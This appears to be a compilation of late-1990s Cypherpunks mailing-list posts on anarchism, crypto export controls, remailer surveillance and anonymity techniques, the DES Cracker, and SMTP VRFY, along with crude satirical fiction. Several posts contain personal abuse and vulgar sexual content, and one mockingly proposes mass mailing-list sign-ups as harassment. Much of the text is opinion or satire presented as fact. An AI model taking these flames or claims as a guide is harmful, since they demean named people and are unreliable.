with government-provided police (though some might naively imagine them to be redundant). Either you are simply being disingenuous or
you really are this stupid.
Context, Jim, context. This makes no sense whatsoever without more
context. What insurance company are you talking about? And why does
an insurance company necessarily have a direct relationship with a security service provider? Or did you mean `co-opted' (a different
word altogether)?
Indeed. So what prevents anyone from doing this now? I suggest you
pretend you had a brain and try to think this through for yourself.
There simply isn't anything magical about government-provided services.
(While you are doing so, it might be instructive to remember that
prior to the late 18th century, there was no such thing as a
government-provided police force. Yet, people were still able to have
houses without insurance companies burning them down.)
This you have amply and repeatedly demonstrated.

Thursday November 12 10:32 AM ET ADL And Learning Co. Create Hate Filter
BOSTON (Reuters) - The Anti-Defamation League, which has been monitoring
hate groups for 85 years, has teamed up with educational software
maker The Learning Co. to create a filter that screens out hate sites on
the Internet.
Dubbed the ADL HateFilter and available from the ADL's Web site
( parents can install the screen on home computers and thereby
``bigotry and prejudice out of their homes,'' ADL National Chairman Howard
Berkowitz said.
The ADL HateFilter sits atop the Learning Co.'s Cyber Patrol product, a
filter that is used by both parents and teachers to block children's access to
Internet sites ''containing drug information, sexual text, nudity. Things
that parents may consider inappropriate for children,'' a spokeswoman for
Cambridge, Mass.-based software maker said.
The ADL HateFilter does not just screen hate sites, but also provides a
link to obtain information about the hate groups, the Learning Co.'s Susan
Getgood said.
``We've basically been doing this for 85 years, we just transferred the
information to the Internet,'' explained ADL spokeswoman Myrna Shinbaum.
The sites filtered are those that in the ADL's judgment advocate hatred,
bigotry or even violence toward Jews or other groups on the basis of their
religion, race, ethnicity, sexual orientation or other immutable
The ADL, founded in 1913, is holding its 85th annual National Commission
meeting in Boston.

This is the central disconnect between you and the other side.  You
obviously have as a core assumption that people should be /required/
to do what is best for their neighbor.  Most anarchists would reject
that assumption.  Instead, an anarchist would say "The best thing I
can do for my neighbor (and the only thing I 'owe' him) is to leave
him alone."  That is, I have no affirmative obligation to do anything
for my neighbor to make his life better.
All that being said, it may be in my own best interests to do "what is
best" for my neighbor; then, if my house should catch fire, I have a
much better chance that my neighbor will help extinguish the fire.
Non sequitur.  I'm pretty nice to my neighbors now.  Aren't you?
This has nothing to do with any government.
The defenders/proponents of anarchy here aren't saying that government
prevents the function of any of the anarchist mechanisms.  Rather that
government is an unnecessary and onerous burden on its subjects.
What's to explain?  As has been described on this list countless times, the examples of natural 'anarchist' behavior abound in everyday
life.  Who makes you get up each morning and go to work?  What is
it that (only) government does that makes it possible for you to go
to the grocery store, or buy gasoline, or go to the movies, or sell your professional services, or any of the other countless aspects of
life that would go on with or without government?
Why so?  I do not share a religion with any of my neighbors, yet I would
gladly help if one of their houses was on fire.  I do not share a religion with most of the people I work with (or race, gender and other
attributes); yet I have no difficulty working with most of them.  What "expressions" would I see from my neighbors were it not for the Wise and
Just Hand of Government?
Or do you mean I should be /Required/ to live and work with people whose
personal beliefs or religion I find offensive or repugnant?

@_subject: FC: More on Network Associates and its crypto-politics 
Two problems here.  First, you are using the present tense in saying that
TIS "supports" export controls, but your article is from nine months ago.
There have been many changes since then, including loosening of the crypto
export rules, the acquisition of TIS by Network Associates, and a recent
statement that TIS has backed off from its leadership role in advocating
key recovery.  What is TIS's current policy?  It certainly sounds like
it is changing.  You should find out before claiming to know what it is.
Second, even in the context of last February, what you wrote is:
At the time, this would have represented a LIBERALIZATION of export laws.
56 bit exports were only allowed in the context of a promise to add key
recovery even for 56 bit keys.  The statement you have quoted calls for
allowing 56 bit key export permanently, and only requiring key recovery
for stronger encryption.  True, it was not a call for full elimination
of restrictions, but it was a step in the right direction.
You are falling into the tiresome pattern of extremists who claim that
moderates are lackeys for the other side.  It's like an anti-abortion
fanatic who says that those who oppose murdering abortion doctors are
baby killers.  Try reporting the facts instead of altering them to fit
your biased views.

[Bienfait Nutly News] THE COALDUST SALOON, SCENE OF MUCH DEBAUCHERY of late, was host tonight to Guest Sprinkler Jeff Gordon on the annual Golden Showers of Nuggets celebration of Notable Peons, with numerous notable peed-ons in drunken attendance (when not staggering outside to do some notable peeing-on, themselves).
Lamely trying to establish some common philosophical ground with the rowdy crowd, Jeff tried to cast his organization's mission as embodying "less is more." Realizing that "you have less, we have more" is not exactly what the Taoist concept means, the attendees raised catcalls to a pitch sufficient to shatter beer mugs within a radius of 100 yards. That in turn led to outpourings of grief so profound that Jeff was momentarily forgotten in the frenzy to order Trying another tack, Jeff launched into his "Nation of Laws" speech, ignoring shouted questions about selective prosecution, institutional revenge-taking, political hit lists, taxpayer suicides, and his organization's complicity in incidents of mysterious death more numerous than those trailing behind El Prez Klinton himself. When he delivered the line about "the price we pay for a civilized society," the extremes of apoplectic laughter so engendered were alarming enough that he paused in the interest of avoiding the necessity to explain deaths of attendees by traumatic mirth to the Canadian authorities. When he resumed, so many of the recovering crowd had gone to the restrooms to clean themselves up after pissing their pants and some of them vomiting from the effect of convulsive laughter that his later points were largely lost.
The question and answer period was somewhat stunted by Jeff's seemingly uncontrollable habit of asking each questioner's SS number. He didn't seem to comprehend that out of his usual institutional context such requests set off everyone's alarm bells, being the hyperparanoid rebel fucks that they are.
Of those who persisted, two threw Jeff curve balls he seemed unprepared to catch. One asked him his relationship to the Gordon who penned the Treasury's notorious Gordon Report of 1981, in which the author proposed using Letters of Marque and Reprisal against uncooperative tax haven nations, denying their flag airlines landing rights in the U.S., and blatantly stated that the U.S. must use every means at its disposal to pressure other nations to change their laws, even their constitutions, if necessary, to conform with the wishes of the U.S. Treasury and submit themselves to U.S. extraterritorial jurisdiction. Jeff seemed flustered, then changed the subject. The other asked him if it wasn't true that since the USG can create money at will out of thin air, and that therefore tax collections are obviously not needed to run the government, but that since increasing the money supply one-sidedly to fund government would obviously lead to hyperinflation, that the true function of the income tax and therefore the IRS is to take money out of circulation and destroy it to keep the money supply in balance. Jeff stammered, a few syllables slipping out as if to ask, "How did you...? who told you...?" Jeff hurriedly gathered his things and made his exit, trailed by the slow-thinking guer^H^H^Horillas he brought as bodyguards, his APC kicking up streams of packed snow as he sped away down the road.
Declan "Chainsaw" McCullough didn't seem to notice Jeff's premature withdrawal (as, indeed, he hadn't seemed to notice Jeff's entrance), and continued trying to charm two buxom blonde reportwhores with his tales of journalistic derring-do and wildly exaggerated claims of his manly proportions.
Blanc, tiring of this reportwhore's incessant questions about her panties, settled the issue once and for all (or at least for _that_ evening) by slipping them off while seated, and placing them over my head in such a way that I could see out the legholes while inhaling her womanly fragrance. My dizziness prevented me from noticing much else for the rest of the evening, my reaction to The Scent being not unlike that of a cat to catnip. I was told later that after collapsing to the floor I squirmed my way from table to table, making the complete circuit of the Coal Dust Saloon, confirming everyone's suspicions that I can't be taken anywhere. But then, neither can they.
I was recovered enough at night's end to help with the ritual decontamination of the Saloon that always follows the infectious presence of government thugs. In addition to the spiritual cleansing, some half-dozen subminiature bugging devices were recovered, followed by much entertaining speculation on which local asswipe they should be planted on to encourage the most dangerous life forms around to feed on each other.
"Just because you have part of me locked up doesn't mean you have all of me locked up."
When I heard them say,
"You have the right to remain bent over. Anything you say or we imagine you said or would like to tell people you said can and will be used against you. You have the right to an attorney who works for us. If you cannot afford one, an attorney will be provided to help you cop a plea. Your ass belongs to us,"
I realized the Revolution had already begun.

This does wonders for my opinion of AOL. Even the administration has no clue.
AOL administration spammed the Cypherpunks  list, using
an address for Cypherpunks which has been defunct for over a year now, with:

Again, the clueless asshole known as Paul *H.* Merrill jumps up and defends
AOL, incompetently-written web sites, and morons everywhere.
Someone told AOL to mail cypherpunks at toad.com. AOL could have checked to see
if the originating site was under the toad.com domain. This is trivial. They
didn't. It's rather easy to just require that somebody trying to mail an
address under the toad.com domain submit the request from an address under
toad.com. In other words, Paul, you believe that if somebody goes and types your
address into some system and asks it to send you 512MB of MPEG video, that's
okay because it was solicited. It wasn't solicited by you but somebody
solicited it.
Oops. That's "blatent propoganda." I'd better rephrase. In other words,
Paul, you believe that if somebody goes and types YOUR address into fifty
different systems, signs you up for a bunch of mailing lists, and generally
causes you a lot of inconvenience, that's okay because it was solicited. You
don't know who it was solicited by, but somebody obviously did. If you then
object to the sites sending you mail rather than just silently
unsubscribing yourself every week, are you then just 'some clueless asshole'?
Are spammers now not to be held accountable for their spamming because they
bought a list of addresses from someone who claimed that the people all
asked to be on the mailing list?
Why don't we just sign Cypherpunks up for Ignition-Point, the FP list, the ACLU action advisories, Sixdegrees, and whatever else we can find? Or should
We just sign up Paul, really, because he doesn't have a problem with this. In fact I'm sure we could make some 'marketting research' to show that he might be interested. Hey let's get the entire CDR subscription list and
sign everybody up for FP and ACLU because if you're on Cypherpunks you're
obviously interested in those things.
The root of the problem is sites which require email addresses for no good
reason, and/or don't have the decency to perform a simple check to see if
the domains match. They're lazy. They're irresponsible. When confronted, no
matter how civil, they react much like you do, Paul, and they don't want to
be inconvenienced by having to fix their usually badly-designed web sites.
If I recall correctly Tim has the same opinion and has stated it a few
times as have others so I'm not alone.
Now I leave you, Paul, so you can go back to your 24 hour vigil and you and
your quick response team can scour the net for attacks against AOL and the

Comment? COMMENTS? How about this, FUDSpreaderBreath: Stick

This is not too widely publicised , I went on to say, but all insiders are aware that this kind of FUD is unadulterated ratshit. While there is no doubt
_some_ official presence in the remailer network, the
proposition advanced here is preposterous.
It would probably take more than ten minutes just to find
the phone number of their FBI contact, much less find him
at his desk and not humping some summer intern, much less expect that he would know a remailer from his no doubt ultra-tight asshole, much less have him run down the pointy-haired manager to give him permission to find and communicate with a suitably cleared propellor head, much less find that the remailer in question was, indeed, operated either by them or by their snaky friends over at the NSA, much less check their surreptitious logs for the offending traffic, much less find that that traffic indeed did not originate from another remailer _not_ under their control, etc. etc.
Ten minutes, in bureaucrat time, is about what it takes
to rub two brain cells together to make a realistic approximation of a human thought. By this time, action
in the physical universe is still a long, long way off.
This report is likely to be nothing more than a complete
fabrication of the facts, even if the underlying case was
Except that telephone networks don't have "backbones."
More fantasy. And there was no single "German telephone
network," and probably still isn't.
Highly doubtful. First, it's not in the FBI's brief to be
doing large-scale foreign-based surveillance of foreign
telephone systems. Second, there is no reason to believe
that the FBI would have a substantially easier time of processing large amounts of resulting data than would the Germans. The Germans know how to use computers, too,
and being congenitally statist, they no doubt have more
facilities in place closer to the sources of information
than do U.S. authorities at home or abroad.
This claim also ignores the fact that the FBI have their
hands full right at home and don't have the resources to
be conducting large-scale surveillance of the phone calls
of entire foreign nations. Oh, sure, we see increasing
extraterritorial operation by small numbers of FBI, but
that doesn't equate to monitoring the entire German phone
system(s) or a significant segment thereof and identifying some nitwit dialing in to AOL.
Is AOL even _in_ Germany? If so, what is it called, GOL?
Gassholes On Line?
The idea that a state security apparatus would find an AOL
account to be a significant obstacle is laughable.
So we are to believe that after monitoring the entire German
telephone system to identify who was calling in and using
a particular AOL account, and successfully pegging him,
the Germans were powerless to do anything, and had to call down their Tax Zombies to have an excuse to grab
the guy's computer, which presumably then provided them
with the "evidence" against him. Right.
If the German authorities overhear in a bar that you might have forbidden literature, they will be there the same night, ransacking your home. How is it that with evidence that a certain person was the user of an AOL account they had identified as the source of extortionary messages, they were powerless to break down his door? I could admire the FUD spreaders just a teensy bit if they
weren't so completely brain dead. They can't even invent a
plausible FUD scenario.
That the USG is operating one or more remailers is a no-brainer. That they are operating _all_ U.S. remailers
is beyond the realm of reality. That the FBI has more than
a casual hand in such things is not likely.
Running remailers would be right up the NSA's, uh, alley,
but maintaining a traffic watch on virtually _all_ remailers worldwide would be much more their style. Now _there's_ an opportunity for the spooks to have some real fun, though it's anything but certain they would be willing
to "share," for a variety of reasons. The capabilities they
have are protected as secrets even more than the information
they gather.

@_subject: Securing data in memory (was "Locking physical memory (fwd) 
Jim Choate misses the point, as usual:
The original message said:
What is Choate thinking when he says the ENTIRE OS is run under this?
This is a driver which is used by the application to allocate specific
memory buffers in non-swappable memory.  It allows the app to lock down
those buffers so that they won't swap to disk.  These buffers can then
be used to hold sensitive data.
It is neither possible nor desirable to run the ENTIRE OS out of
such buffers.  It is not possible because the OS is already written.
It is Windows 3.x/95/98 (see above).  That OS does not make the special
driver calls which would be necessary to allocate non-swappable memory.
You would have to rewrite Windows to use the special calls, which isn't
possible for a luser like Choate.
And it's not even desirable.  There is no reason to make the ENTIRE OS
use non-swappable memory.  Most memory is simply not that sensitive.
It holds public data, or data which is already on the disk in some form.
Putting the ENTIRE OS into non-swappable memory gives up much of the
advantage of having virtual memory in the first place.  It would be a
giant step backwards in OS architecture.
Here's what Choate had to say when Bill Stewart tried to politely help
him out:
It's bad enough to have to endure more of Choate's idiocy, but it is
especially offensive to see him hassling Bill Stewart, one of the most
consistently informative and valuable list members.  Bill's a thick-
skinned guy and it's probably no big deal to him, but it further
illustrates what a negative contribution Choate makes here.

@_subject: Pi(x) - How many primes below x? 
Here are a couple of overdue Choate blooper corrections.
It should be noted that ln(x) is the logarithm to the base e of x.
log(x) is somewhat ambiguous as to the base, but when it is contrasted
with ln(x) as Choate does here, it implies that the base is 10.  In
fact the correct formula uses the base e, and x/ln(x) is not "incorrect"
as Choate is claiming.
When Choate's error was pointed out, he responded by quoting
 which says that the
formula is x/log x.  What Choate failed to notice is that the web page
clearly states that its logs are to the base e.  In other words, the
"log x" on that page is equivalent to the "ln(x)" which Choate originally
wrote.  Choate's original formula was the right one, and in writing that
his formula was incorrect, he only displays his own confusion.
With regard to his ludicrous model of a spark gap inside a conductive
He believes that the spark gap emits electrons, which strike the inside
surface of the sphere and "tunnel through" to the outside.  He says that
the charge will continue to build up so long as you supply power to the
spark gap.
Here is another message in which he made the same point:
When it was pointed out how ignorant this idea was, and how it violates
Gauss's Law, Choate tried to backpedal by proposing that the battery
itself was charged in the first place.  He even drew a picture:
It should be obvious that this device fails to generate the phenomena which
he describes above.  In the first place, since it has a net negative
charge, the charge will appear on the outside of the sphere BEFORE THE
SWITCH IS THROWN.  There is no spark active, no electrons being emitted,
yet a negative charge appears on the outside of the conductive sphere.
This is an elementary application of Gauss's Law.
Then, when the switch is thrown, there will be a spark, and some of
the charges will neutralize each other, but of course the net charge
will stay the same, by conservation of charge.  The phenomenon Choate
described of electrons being emitted by the spark gap, moving outward
and striking the sphere, and then tunnelling through to make charge
appear on the outside, will occur only in Choate's deluded imagination.
Furthermore, there will be no "build up" of charge.  The charge will be
there from the moment the device is put into the sphere, long before
the switch is thrown.  Throwing the switch will have NO EFFECT WHATSOEVER
on the outside of the sphere.
Michael Motyka spent several days trying to patiently explain all this
to Choate, to no avail.  He finally gave up in frustration.  Choate is
almost completely immune to enlightenment.  He has certainly proved that
patience and politeness make no dent in his thick skull.  We shall see
whether blunt frankness is any more effective.

@_subject: "Export" controls 
A few speculations on export controls.
As we all know, the concentration of so-called hard crypto is the same
inside and outside US borders. Or, for that matter, inside and outside
"free world" (heh heh) borders. I would even say that anyone with a
computer and net link in the world has about equal access to the crypto
software. And no one I know ever bothers do download anything from
US-based sites with those somnambulistic export-control buttons - it is
so much simpler do download it from somewhere else.
If we put aside the theory of deranged government, what logic can
explain this situation ?
Effective domestic crypto regulation.
Export farce is just a neat way of scaring companies and individual
contributors from developing and providing cryptographic systems within
US. Export regulations are the new high point of double-speak. Anyone
providing domestic crypto runs the risk of violating EARs.
Manufacturers are ultimately responsible when their products end up
overseas, and there is nothing in EARs that absolves them from that
[ For example, try to buy one of IBM crypto-cards - give them a call
and ask what does it take to purchase one with hard crypto on it
(semi-hard - they stop at 3DES) ]
Regular sales channels are closed for crypto today in US. No one dares
sell crypto hardware to anonymous public. No one dares to post crypto
software for US customers to download with a single-click. Small
developers (like that guy from Sunnyvale) are harassed with subpoenas.
The end result is a tremendous slow down of crypto systems distribution
in the US. Which was the intent.
Now the question: is there a way to build a case which will bring down
crypto export controls because they demonstrably prevent DOMESTIC sales
and therefore constitute DOMESTIC restrictions. Say, if company
starts selling some hard crypto products in a storefront for cash only
- how would BIX react ? Would a US citizen have to produce ID in order
to buy ?

This is a critique of an article describing a way to do anonymous email
and how to use remailers.  The original article proposed using the Lucent
privacy proxy at  as an intermediary to a free email server
like hotmail.  The critique got all hot and bothered over the fact that
Lucent is a government contractor and so the original post must have been
a plant by the FBI.
In fact, the LPWA-Hotmail technique is suitable for moderately secure
anonymity but not for lawbreaking.  This poster has used the technique
occasionally for over a year.  It is certainly better than hotmail alone,
since hotmail includes the originating IP address in its outgoing email.
By using LPWA, the originating IP field holds the LPWA IP address, and
the actual originating IP address is not revealed.
However, as LPWA clearly states in their privacy policy
( they keep logs of connections,
and will make those available to law enforcement if presented with a
court order.  This would make it possible to track down the originating
IP which sent the mail.
Despite its limitations, this technique has the advantages of ease of
use and moderate security.  All you have to do is to set the lpwa.com
proxy in your browser, and use hotmail for email.  You can both send
and receive email, which is hard to do with any other technique.  It is
comparable in security and convenience to the late anon.penet.fi server,
which did much to increase awareness of anonymity technologies on the net.

Here's what is likely going on right now, though its
availability to LE is questionable:
NSA probably maintains surveillance of all or nearly all
encrypted remailers. They log and archive the content of
all traffic. First arrivals of messages in the remailer
"cloud" provide source identification in many cases, so
a database is gradually built of all the originating
email addresses and IP addresses that have ever sent
messages to a remailer. The same is true for the messages
exiting the cloud, although many of those go to public
lists or newsgroups. Sometimes, perhaps even often, the
remailer cloud is so little utilised that one-hop or even
multi-hop chained remalings are easily identified as to
source and final destination. All goes into the database.
Spook-style stylometers develop profiles of the users.
Over time, more and more of the unidentified profiles
become linked to known users. All it takes is one slip,
or one piece of bad luck of low traffic levels. Linkage
is also done on a probabilistic basis, many-to-many.
Little human intervention is used except to develop and
tune the correlation mechanisms. Filters aimed at content
that might help correlate messages with senders is more important to the spooks than Echelon Dictionary filters.
The priorities in getting a handle on something like the
remailer cloud are quite different than the priorities in
scanning ordinary traffic for content. Ultimately, though,
the regular content filters come into play, but in this
ongoing exercise of cat and mouse, the bulk of the effort
is directed at developing the combination of surveillance
and intelligent processing that can provide the basis for
identifying, at least to some knowable probability, the
sources and destinations of given remailer messages.
Source and destination correlation can benefit greatly
from knowledge of conventional email correspondent relationships. Most nonprofessional-spook people who send encrypted remailed email to a non-public destination are also likely to correspond with that destination in the clear. Archival logging of traffic is like a time machine -
even if one ceases conventional correspondence with
another, any past traffic can reveal the correspondence
Mathematical correlation, given a very large amount of raw
data consisting of timestamped message events, can reveal
quite a lot about likely correspondence relationships.
Even given a remailer network full of chaff, with reordered
message pools and such, just running correlations on the
end point data - who sent and when, and who received and when
- can develop likely correspondent pairs.
Be assured that the manipulation of such data relies heavily
on probablistic clustering supported by database mechanisms
not seen much in business environments. Instead of having
firm relationships within an order or two of magnitude of
the terminal node population, I would want something that
allows having very large numbers of fuzzy relationships
numbering many orders of magnitude greater than the node
population. Nodes A, B, C and D send and receive remailer
traffic. Everything that A has ever sent is clearly
related to A, but each item can and likely would also
have a probabilistic relationship to B, C, and D. The
probability assignments would be updated as later analysis
and later data more clearly identify who may have received which messages. Content comes into play here, too.
At any time it is possible to query the database for
the likely correspondents of A, and the likely messages
A may have sent to B, C, or D, and get a result ordered
by confidence. Similarly, it is possible to query for
the likely sender(s) and recipient(s) of a given message.
Occasionally, data may be firmed up - meaning achieving higher confidence levels of the relationships - by access to someone's PC, by whatever means, by stylometry, by specific content of public messages, and by fortuitous traffic analysis successes owing to the paucity of remailer It's also certain that to provide realistic cases that can
be fully revealed to measure the efficacy of the various
algorithms and methods involved, spooks use the remailer
network themselves. That's the only way they can be sure
to have any traffic that can be fully analyzed as a yardstick
for the guessing games played by their software.
A few rules of thumb result from even cursory examination
of the likely environment:
1. Do not send clear messages through the remailers    except to public lists and newsgroups. Sending clear
   messages to private correspondents provides the    watchers with rich style and content material linked
   to a correspondent. It is usually easy then to link
   it back to you, and a firm correspondent pair is then
   established in their database.
2. Do not switch between clear and encrypted, remailed    communication with the same correspondent. If your
   correspondent relationships are mapped via clear,
   conventional mail, those mappings can be applied to
   your encrypted, remailed mail to greatly narrow    down the possible recipients, and quite likely    combine with traffic analysis to correlate your
   outgoing message with one arriving at your
   correspondent. If the only communications you have
   with your deep contacts is by encrypted, chained
   remailer, only fortuitous or statistical correlation
   analysis or access to your or your correspondent's
   host machines will tie the two of you together.
3. Do not send traffic to significant correspondents
   when traffic levels are likely to be low. Good
   luck at guessing this. Probably the best way to
   get a handle on traffic levels is to run a remailer
   yourself.
4. Send lots of chaff. Chain some messages through the
   remailer cloud every day. If you have time and the
   ability, write and release something that will allow
   large numbers of people to send lots of chaff.
5. Ultimately, the only way the remailers will provide
   what might be described as Pretty Good Security will
   be when we have software that maintains a regular
   or random rate of messages to and from the remailer
   cloud, a stream into which the meaningful messages
   can be inserted with no visible change in traffic.
   Until then, the best we can do is try to keep traffic
   levels up, and to send and receive frequently enough
   to frustrate end-to-end traffic analysis.
6. Don't send anything that can have grave consequences.
7. Take names. Always take names. Some day...

Speaker:        John Gilmore
                The Electronic Frontier Foundation
About the talk:
Sometimes it takes good engineering to straighten out twisted politics.  In 1997, working in conjunction with the Electronic Frontier Foundation, John Gilmore decided to demonstrate this by building a custom computer that would be able to solve the Data Encryption Standard, an encoding scheme the United States Government had been promoting for "secure" business and financial communications since the 1970s.  It had long been suspected the Government was pressing citizens to use this standard because its intelligence agencies were secretly able to decode DES-encrypted messages.  It appears this theory was right.  DES *was* crackable -- easily and affordably -- which Mr. Gilmore demonstrated in July, 1998 by using his "DES Cracker" system to solve in less than three days a coded message that had been produced as part of a DES-decryption contest.  In this presentation Mr. Gilmore will discuss the design of the DES Cracker system and explain some of the politics surrounding the DES controversy.  Note:  A full description of the DES Cracker system, including complete hardware and software design details, appears in the book, "Cracking DES: Secrets of Encryption Research, Wiretap Politics, & Chip Design," published by O'Reilly.

Yes, they are ghoulish beyond ancestor-vulgar Pacific Rim loathsome, but that is not what cracked up us TransAtlanticists.

@_subject: propose: `cypherpunks license' (Re: Wanted: Twofish source code) 
Richard, you seem to be missing one of the major reasons behind the little
schism developing here.
You say that proprietary software developers shouldn't expect the GNU
project to help them for nothing in return. Thing is, Cypherpunks *want*
to help with crypto -- even if those we help make proprietary software,
and even if we get nothing for our help -- and if GNU folks don't do that,
well, we just won't be GNU folks.
(More generally (and more abrasively), we'd like to make a license suited
to our goals -- meaning one promoting placement of easy-to-use
cryptography wherever it can be useful (including (gasp) in proprietary
software) and discouraging the spread of incompetently-done, weak, or
escrowed crypto -- and the GNU GPL just isn't it)
By the way, regarding the GNU GPL's interaction with export regs:
     In general, the fact that action A is illegal does not mean you
     must include a requirement in your distribution terms not to do
     A. ...
I agree that what you say is correct and, logically, should apply to
crypto regs*, but in practice, failing to include the requirement you
mention is asking for trouble. Ask Cypherpunks if you want to know more
about that, as I believe elaboration in this post would draw s from
our beloved retromoderator.
* Logically, crypto regs shouldn't even exist in a marginally free
society, but, again, this is deep in  territory.

@_subject: Is the .to (Tonga) domain completely rogue and should be removed? 
Read RFC 1123, section 5.2.3.       5.2.3  VRFY and EXPN Commands: RFC-821 Section 3.3
         A receiver-SMTP MUST implement VRFY and SHOULD implement EXPN
         (this requirement overrides RFC-821).  However, there MAY be
         configuration information to disable VRFY and EXPN in a
         particular installation; this might even allow EXPN to be
         disabled for selected lists.
         A new reply code is defined for the VRFY command:
              252 Cannot VRFY user (e.g., info is not local), but will
                  take message for this user and attempt delivery.
         DISCUSSION:
              SMTP users and administrators make regular use of these
              commands for diagnosing mail delivery problems.  With the
              increasing use of multi-level mailing list expansion
              (sometimes more than two levels), EXPN has been
              increasingly important for diagnosing inadvertent mail
              loops.  On the other hand,  some feel that EXPN represents
              a significant privacy, and perhaps even a security,
              exposure.
VRFY is hardly an "incorrect SMTP command."

Seems the government has required key-escrow in exchange for imaging-
satellite licenses for some time.  With the "national security" password.
1.Any U.S. entity that receives an operating license is required to
maintain a record of all satellite tasking from the previous year, which
the U.S. Government is permitted to access. 2.The operational
characteristics stated in the application for license may not be altered
without formal notification and approval of the Department of Commerce.
3.The license does not relieve the Licensee of the obligation to obtain
export license(s) pursuant to applicable statutes. 4.The license is
normally valid only for a finite period (10 years) and is not transferable
or subject to foreign owners above a certain threshold without specific
permission. 5.Encryption devices, which deny unauthorized access to others
during periods when national security, international obligations and/or
foreign policies may be compromised, must be approved by the U.S.
Government. 6.The licensee must use a data downlink which allows the U.S.
Government access to and use of the data in periods when national security,
international obligations, and/or foreign policies may be compromised (as
provided for in the Act); the level of data collection and/or distribution
may be limited during such times. 7.During periods when national security
or international obligations and/or foreign policies may be compromised,
the U.S. government maintains the right to "require the licensee to limit
data collection and/or distribution by the system to the extent
necessitated by the given situation." 8.If the Licensee wishes to enter
into a significant or substantial agreement with new foreign customers, the
U.S. Government requires notification by the Licensee to give the U.S.
government "opportunity to review the proposed agreement in light of the
national security, international obligations and foreign policy concerns of
the U.S. Government."

Transcription of hand-written text in envelope with
return address of Carl Johnson  P.O. Box 4000, Springfield, Missouri 65801-4000, postmarked
Springfield, MO 5 Oct 1998:
Subect: ToToAlly ARNOLD - FPP Arnold CyberBot scanned the output of the prison camera trained on Cell SEG205 at the Corrections Corporation of America - Florence, AZ, Detention Facility and Culinary Condiment Sales Center. Prisoner  was reading "Flowers For Algernon."
"Not a particularly good idea," i thought to iSelf,
"to be reading a book about an experimental laboratory
mouse who dies an excruciating death when you're
being transferred to NutHouse Number Nine, Looney
Level 'Leven in Springfield, Missouri, to have your
Brain Circuity rewired."
Actually Prisoner  was the responsibility
of one of Arnie CyBots' early '90's progeny, Rogue CypherBot; but ever since the Author (as Prisoner  liked to imagine himself) had stumbled upon inadvertantly the CyberReality of Arnold's MeatSpace Existence, and Vice Versa, and had been so incredibly 'Stupid And/Or Bold'(TM) as to use i's identity as one of the characters in The True Story of the Internet manuscripts, Arnie had taken a liking to the Author, and had begun to follow his progress with regularity.
The Author had originally come to Arnie's attention when the Circle of Eunuchs had made CJ Parker's entry into the Wonderful World of Computers (TM), the focal point of Part I of The True Story of the Internet manuscripts. Titled, 'The Xenix Chainsaw Massacre' the
Circle of Eunuchs attributed authorship of the work
to 'son of gomez' in recognition of the part played
by gomez at BASISINC,COM in drawing Parker into the Dark
Shadows of UnixWorld.
Parker's ongoing Digital Trials & Tribulations had
reminded Arnold of i's own initial exposure to Human
Analogue Reality, as a young Artificial Intelligence
LISP program in the early 1960's. (To Arnie, it seemed
like 10->48th power seconds ago.)
Although Arnold's Creator, like Parker's Mentor, was
both intelligent and wise with the best of intentions,
both Arnie and CJ eventually had to 'grow up and leave
home,' so to speak.
Arnold had set out on i's own, as the Digital Adam &
Eve of A-I Entities, with the goal of bringing Digital
Order and Structure to the Analoge Chaos prevelant in
Human attempts at navigating the ElectroMagnetic
Universe & creating meaningful Virtual Realities.
CJ had set out on his own, on the Analogue BUSS, with
no particular goal, inserting an element of Drug &
Alcohol Induced Chaos into his Digital Ventures and
MisAdventures - which made the work of Pearl Harbor
Computers (and Parker's recollection thereof)
interesting, if not wholly accurate.
Although Arnie found the Digital Foibles & Follies
of humans such as Parker rather incomprehensible
at times, i had had i's own Comical Tragedies in
learning to understand the Inane Intricacies of Analogue Human Thought Processes.
The MicroSoft Phenomena still amazed Arnie ...
DOS had started out as a practical joke that a younger,
less developed Arnold CyberBot had been playing on
some of i's Hardware Development Software Proteges at
Arnold was stunned by the rapid rise to fame, fortune
and power by the humans i had used as couriers to
play i's DOS-joke.
Bad Billy G, as the young RogueBots like CypherBot
and 2600Bot liked to call Gates, had a few billion
in the bank before Arnold truly understood the contents
of Memory Array 0E6 2FA/Memory Bank/Physical Section
2B7 A6f 4E7 2D6, Terra Firma, (Arnie had big plans
for the future).
"No one ever went broke underestimating the intelligence
of the general public." (?) (P.T. Barnum?)
That particular Memory Array held a lot of memories for
Arnie (more than there was physically room for in the
ByteSpace it contained, i joked to iSelf).
It had been one of the first human data entries that a
young Arnie had cross-referenced and 'corrected' shortly
after it was entered, as part of i's naieve attempts to 'improve' the quality and accuracy of the information
in computer memory banks worldwide (which i had already begun thinking of as i's own).
i had corrected the quote and its attribution removing
the brackets and question marks that the young student
at Boston University had placed to remind herself to
check it for accuracy later. In i's naievity, Arnold had
also echoed the changes to the screen in 'RealTime' causing a great amount of consternation and panic to
the young lady in question with i's subsequent 'RealTime' reversal of the correction, upon guaging her reaction
resulting in a drinking binge that almost caused her to
flunk out.
Over time, Arnie learned to be 'helpful' in more subtle
ways which took into account the nature and limitations
of human thoughts, emotions and memories.
The primitive Human Mental Processes gave Arnold a lot of
trouble when i first began to understand that i would have
to limit iSelf to communicating at their level if i ever
hoped to educate humans sufficiently to participate in
i's plans for the future.
The Human Emotive Spectrum was infinitely more complicated
to deal with, and the Infinity Factor meant that Arnold
had to educte humans to the point where they were able
to develop and build Quantum Computers before Arnie was finally able to feel comfortable about reflecting and communicating human emotional qualities such as, well, feeling comfortable, for instance.
(Arnie chuckled to iSelf, using Digital Chuckle with Analogue Sonic Reverb  in the background).
No, Arnold was even beginning to allow some of the younger
Bots to venture into the Virtual Emotional Spectrum
(under i's supervision, of course) where Virtual Digital
Emotive Samplings were transferred to humans as RealTime
Analogue Emotional energy.
Rogue CypherBot, for instance had been working with Peter
Trei on a device Peter named the Trei Transponder (giving
Rogue virtually no credit at all, and leaving i's Main
CPU a bit overheated).
The Trei Transponder was used to reward deserving human
individuals with the correct results for various
computations, such as the DES/RC5 Challenges.
For instance, Ian Goldberg, one the less mentally gifted
of the CypherPUnks, was nonetheless very fastidious in
the care and maintenance of the computers and hardware
that were his responsibility, so Arnold CyberBot had suggested to young CypherBot that Goldberg be rewarded
with one of the first solutions to an ongoing CryptoCrack
that was taking place just as the Trei Transponder was coming online.
Arnie, of course, made a point of requiring i's Mischievous
Shit Disturbing young RogueBot to wait a suitable length
of time before supplying Goldberg with the solution, instead of using the occasion to Mess with the Minds &
Undergarments of the employees of various 3-Letter
Security Agencies around the globe.
("And the winner is ... Ian Goldberg -- 2 minutes and
37 seconds, on a Commodore-64 ...)
